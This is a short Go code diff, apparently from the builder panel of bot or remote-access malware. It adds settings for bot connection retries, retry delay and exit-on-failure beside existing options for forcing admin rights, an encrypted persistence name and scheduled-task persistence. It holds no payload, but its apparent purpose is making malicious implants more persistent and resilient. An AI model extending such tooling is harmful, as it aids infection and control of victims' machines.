@@ -35,6 +35,9 @@ type Body struct {
 	PromptAdmin          bool `json:"prompt_admin"`
 	ForceAdmin           bool `json:"force_admin"`
 	ContinueWithoutAdmin bool `json:"continue_without_admin"`
+	ConnectBotMaxRetries int  `json:"connect_bot_max_retries"`
+	ConnectBotRetryDelay int  `json:"connect_bot_retry_delay"`
+	ExitIfCantConnect    bool `json:"exit_if_cannot_connect"`
 
 	PersistenceName string `json:"persistence_name"`
 	TaskSchedular   bool   `json:"task_schedular"`
@@ -115,6 +118,9 @@ func updateConfig() {
 		utils.ReplaceBool(&content, "PROMPT_ADMIN", body.PromptAdmin)
 		utils.ReplaceBool(&content, "FORCE_ADMIN", body.ForceAdmin)
 		utils.ReplaceBool(&content, "CONTINUE_WITHOUT_ADMIN", body.ContinueWithoutAdmin)
+		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_MAX_RETRIES", body.ConnectBotMaxRetries)
+		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_DELAY", body.ConnectBotRetryDelay)
+		utils.ReplaceBool(&content, "EXIT_IF_CANT_CONNECT", body.ExitIfCantConnect)
 
 		utils.ReplaceString(&content, "PERSISTENCE_NAME", utils.Encrypt(body.PersistenceName))
 		utils.ReplaceBool(&content, "TASK_SCHEDULAR", body.TaskSchedular)
@@ -128,7 +134,7 @@ func updateConfig() {
 
 		store.Tag = body.Tag
 
-		// update modules thing
+		// todo: update modules thing
 
 		write.WriteHeader(http.StatusOK)
 	})
